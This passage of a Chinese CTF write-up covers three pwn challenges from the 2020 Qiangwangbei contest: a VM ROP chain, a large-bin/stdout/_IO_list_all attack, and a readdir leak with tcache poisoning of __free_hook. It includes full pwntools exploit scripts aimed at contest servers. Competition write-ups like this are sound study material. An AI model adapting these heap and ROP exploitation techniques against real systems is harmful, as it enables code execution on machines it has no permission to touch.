class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x42</span>]</span><br><span class="line">a2 = [<span class="number">0x8A</span>, <span class="number">0x9B</span>, <span class="number">0x17</span>, <span class="number">0xDC</span>, <span class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x24</span>, <span class="number">0x10</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x74</span>, <span class="number">0x12</span>]</span><br><span class="line">a2 = [<span class="number">0xFA</span>, <span class="number">0xED</span>, <span class="number">0x70</span>, <span class="number">0x5E</span>, <span class="number">0x70</span>, <span class="number">0x22</span>, <span class="number">0x3A</span>, <span class="number">0x21</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0x23</span>, <span class="number">0xC1</span>, <span class="number">0xAB</span>, <span class="number">0x12</span>, <span class="number">0x58</span>, <span class="number">0x96</span>, <span class="number">0x34</span>, <span class="number">0x86</span>]</span><br><span class="line">a2 = [<span class="number">0x77</span>, <span class="number">0xB3</span>, <span class="number">0xD2</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0x5A</span>, <span class="number">0xA7</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x36</span>, <span class="number">0x12</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0x32</span>, <span class="number">0x12</span>]</span><br><span class="line">a2 = [<span class="number">0xDD</span>, <span class="number">0x37</span>, <span class="number">0x71</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p> 即可得到：<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>。</p></li><li><p>接下来<code>check</code>通过，可以向栈上写入<code>0x800</code>bytes数据，之后通过<code>ret</code>，也就是从栈上取出地址再跳转。而写入的<code>0x800</code>字节可以覆盖这个返回地址，那么这样看来这个题目其实就是需要通过在vm中实现rop。</p></li><li><p>根据前面所分析的，存在<code>open</code>，<code>read</code>，<code>write</code>调用，而且对跳转地址有范围内的检查，所以只能在载入的<code>test.bin</code>寻找vm gadget，然后通过orw的方式获取flag。</p><p> 而其实也不难注意到<code>test.bin</code>中存在一段比较可疑的数据，仔细查看可以发现</p><p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/pop_regs.png" alt="pop_regs"></p><p> 存在上图这样的<code>pop r0; ret;</code>和<code>pop r1; ret;</code>等gadget，也就是说<code>r0, r1, r2, r3</code>都是可控的，满足了0x20调用的条件，而且：</p><p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/syscall.png" alt="syscall"></p><p> 同时存在0x20调用。</p></li><li><p>那么就很简单了，通过构造rop的方式来orw即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'47.94.20.173'</span>, <span class="number">32142</span>)</span><br><span class="line"></span><br><span class="line">pop_r0 = <span class="number">0x2F5</span></span><br><span class="line">pop_r1 = <span class="number">0x377</span></span><br><span class="line">pop_r2 = <span class="number">0x45C</span></span><br><span class="line">pop_r3 = <span class="number">0x4E1</span></span><br><span class="line">syscall = <span class="number">0x5B1</span> <span class="comment"># read is 1, write is 2</span></span><br><span class="line">syscall_open = <span class="number">0x6ED</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">'QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO'</span></span><br><span class="line">p.sendafter(<span class="string">"password: \n"</span>, password)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x108</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">1</span>, pop_r1, <span class="number">0</span>, pop_r2, <span class="number">0</span>, pop_r3, <span class="number">0x8</span>, syscall]) <span class="comment"># read</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">0</span>, pop_r1, <span class="number">0</span>, pop_r2, <span class="number">0</span>, syscall_open]) <span class="comment"># open </span></span><br><span class="line">payload += flat([pop_r0, <span class="number">1</span>, pop_r1, <span class="number">4</span>, pop_r2, <span class="number">0x10</span>, pop_r3, <span class="number">0x40</span>, syscall]) <span class="comment"># read</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">2</span>, pop_r1, <span class="number">1</span>, pop_r2, <span class="number">0x10</span>, pop_r3, <span class="number">0x40</span>, syscall]) <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"PWNITNOW!GOGO!"</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">"/flag\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h1><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ol><li><p>首先binary通过<code>mallopt(1, 0)</code>禁用了fastbin，但是在<code>read_str</code>中存在一个<code>off by null</code>：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_str</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">-1</span>; ; *(_BYTE *)(a1 + i) = buf )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a2 + <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - <span class="number">1</span> == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      buf = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(a1 + ++i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    ++i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>其次注意到binary是没有<code>show</code>功能的，所以很容易想到要打<code>stdout</code>来leak libc。</p></li><li><p>在没有fastbin的情况下，那么可以利用这个off by null完成unlink attack，形成chunk overlap，可以伪造出large bin，来进行large bin attack。因为我们知道在将一个比原large bin的size要大的unsorted bin链入large bin的时候，会使得<code>large bin-&gt;bk-&gt;fd = unsorted bin</code>以及<code>large bin-&gt;bk_nextsize-&gt;fd_nextsize = unsorted bin</code>，也就是能达到同时向两个任意地址写入堆块地址的目的。</p></li><li><p>同时注意到只要控制<code>stdout</code>的<code>_flags = 0xXXXXY800</code>（Y为奇数）以及<code>_IO_write_base &lt; _IO_write_ptr</code>即可触发输出相应缓冲区数据效果，从而leak出libc，所以采用控制unsorted bin的地址的低2 bytes（Y由于ASLR而随机）为<code>Y800</code>然后通过<code>large bin-&gt;bk-&gt;fd</code>写入，以及错位写<code>_IO_write_base</code>的低字节为<code>\x00</code>的方法。</p></li><li><p>而由于large bin的<code>fd_nextsize</code>和<code>bk_nextsize</code>都是堆地址，我们要改到<code>stdout</code>的地方只能通过partial write，所以还要稍微做一下堆的排布，使得两个unsorted bin的<code>bk</code>分别先后占住large bin的<code>bk_nextsize</code>和<code>bk</code>的位置。</p></li><li><p>leak出libc之后，再通过一次large bin attack覆盖<code>_IO_list_all</code>为可控的堆地址，这样就能劫持<code>_IO_FILE</code>的vtable写入onegadget，在binary进行<code>exit</code>的时候触发来getshell。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size:"</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line">    p.sendafter(<span class="string">"content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"idx:"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">stdout = <span class="number">0x3c5620</span></span><br><span class="line">_IO_list_all_offset = libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">one_gadget_offset = <span class="number">0xf1207</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># chunk overlap</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0xF8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 3</span></span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 4</span></span><br><span class="line">        add(<span class="number">0x2E8</span>) <span class="comment"># chunk 5</span></span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 6</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">3</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x3E</span> + <span class="string">'\n'</span>) </span><br><span class="line">        edit(<span class="number">4</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x1F</span> + p64(<span class="number">0x8F0</span>)) <span class="comment"># off by null</span></span><br><span class="line">        edit(<span class="number">5</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x2E</span> + <span class="string">'\n'</span>) </span><br><span class="line">        edit(<span class="number">6</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * <span class="number">0x1F</span> + <span class="string">'\n'</span>) </span><br><span class="line">        delete(<span class="number">0</span>) </span><br><span class="line">        delete(<span class="number">5</span>) <span class="comment"># unlink attack</span></span><br><span class="line"></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 0</span></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>) <span class="comment"># unsorted bin</span></span><br><span class="line">        add(<span class="number">0x3E8</span>) <span class="comment"># chunk 5 (gap)</span></span><br><span class="line">        add(<span class="number">0x18</span>) <span class="comment"># chunk 7 (gap)</span></span><br><span class="line">        add(<span class="number">0x2D8</span>) <span class="comment"># chunk 8 (use all)</span></span><br><span class="line">        delete(<span class="number">3</span>)</span><br><span class="line">        delete(<span class="number">8</span>)</span><br><span class="line">        add(<span class="number">0x2D8</span>) <span class="comment"># chunk 3 (get large bin)</span></span><br><span class="line"></span><br><span class="line">        delete(<span class="number">2</span>)</span><br><span class="line">        add(<span class="number">0x108</span>) <span class="comment"># chunk 2</span></span><br><span class="line">        add(<span class="number">0x1E8</span>) <span class="comment"># chunk 8 (use all)</span></span><br><span class="line">        delete(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">0x1F8</span>) <span class="comment"># chunk 1</span></span><br><span class="line">        add(<span class="number">0x28</span>) <span class="comment"># chunk 9 (use all)</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>) <span class="comment"># fix</span></span><br><span class="line"></span><br><span class="line">        edit(<span class="number">4</span>, <span class="string">"A"</span> * <span class="number">0xE8</span> + p64(<span class="number">0x21</span>) + <span class="string">"A"</span> * <span class="number">0x18</span> + p64(<span class="number">0x421</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        delete(<span class="number">3</span>) <span class="comment"># unsorted bin</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># libc_base = _base(_libc)</span></span><br><span class="line">        target = <span class="number">0x5620</span> + <span class="number">0x5000</span><span class="comment"># + libc_base</span></span><br><span class="line">        edit(<span class="number">9</span>, p64(<span class="number">0</span>) + p16(target - <span class="number">0x10</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        edit(<span class="number">8</span>, p64(<span class="number">0</span>) + p16(target - <span class="number">0x20</span> + <span class="number">0x19</span>) + <span class="string">'\n'</span>)</span><br><span class="line">        delete(<span class="number">0</span>)</span><br><span class="line">        add(<span class="number">0x3D8</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">"\x00"</span> * <span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x3c36e0</span></span><br><span class="line">        _IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">        one_gadget = libc_base + one_gadget_offset</span><br><span class="line">        heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"fail"</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p = remote(<span class="string">'39.101.184.181'</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># large bin attack again</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x231</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + p64(<span class="number">0x301</span>) + <span class="string">"A"</span> * <span class="number">0xF8</span> + \</span><br><span class="line">     p64(<span class="number">0x401</span>) + p64(libc_base + <span class="number">0x3C4F68</span>) + p64(_IO_list_all - <span class="number">0x10</span>) + \</span><br><span class="line">     p64(heap_base + <span class="number">0x300</span>) * <span class="number">2</span> + <span class="string">'\n'</span>) </span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, <span class="string">"A"</span> * <span class="number">0xE0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x411</span>) + <span class="string">'\n'</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x3E8</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget) * <span class="number">28</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x411</span>)</span><br><span class="line">payload += <span class="string">"\x00"</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + <span class="string">"\x00"</span> * <span class="number">0xA8</span> + p64(heap_base + <span class="number">0x7E0</span> - <span class="number">0xF0</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h1 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h1><h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>首先这个<code>edit</code>对<code>offset</code>的检查不够严格，所以可以向任意负偏移的位置写值：</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)open_status;</span><br><span class="line">  <span class="keyword">if</span> ( open_status )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"Index: "</span>);</span><br><span class="line">    result = choice();</span><br><span class="line">    v3 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = chunk_array[result];</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Offset: "</span>);</span><br><span class="line">        v4 = choice();</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"Size: "</span>);</span><br><span class="line">        v1 = choice();</span><br><span class="line">        nbytes = v1;</span><br><span class="line">        v2 = v4 + v1;</span><br><span class="line">        result = chunk_size[v3];</span><br><span class="line">        <span class="keyword">if</span> ( v2 &lt;= (__int64)result )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">"Content: "</span>);</span><br><span class="line">          <span class="built_in">read</span>(<span class="number">0</span>, (<span class="keyword">void</span> *)(chunk_array[v3] + v4), nbytes);</span><br><span class="line">          result = puts_(<span class="string">"Done!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 那么可以轻易的伪造unsorted bin。</p></li><li><p>但是同时注意到这也是一个”无 leak“的题目，因为没有常规的<code>show</code>功能，而且这个时候因为没有<code>puts</code>，所以通过<code>stdout</code>去leak的思路是行不通的。</p></li><li><p>这个时候关注一下这个<code>opendir</code>和<code>readdir</code>，<code>opendir</code>会在对上开辟一块<code>0x8040</code>大小的chunk，一开始内容是空的，而在调用完<code>readdir</code>之后会发现这个chunk被写入了很多内容，比较明显的就是包含了当前目录下所有的文件名。这个时候查一下<code>readdir</code>到底干了什么:</p><p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/struct.png" alt="struct"></p><p> 大概就是<code>readdir</code>会返回一个指向当前文件信息的结构体，而在<code>close file</code>功能的<code>result = puts_((const char *)(v1 + 19));</code>也可以看出，这个<code>+19</code>正好就是指向文件名了，也就是<code>d_name</code>。</p></li><li><p>那么leak的思路就有了，就是利用unsorted bin-&gt;fd或bk，将某个结构体的<code>d_name</code>给覆盖掉，那么在某次调用<code>close file</code>打印文件名的时候，就会把这fd或者bk给打印出来，从而leak出libc。</p></li><li><p>接下就是直接<code>tcache poisoning</code>打<code>__free_hook</code>为<code>system</code>即可。</p></li><li><p>exp：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">""" N0p / AAA """</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'106.14.214.3'</span>, <span class="number">1912</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, offset, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span 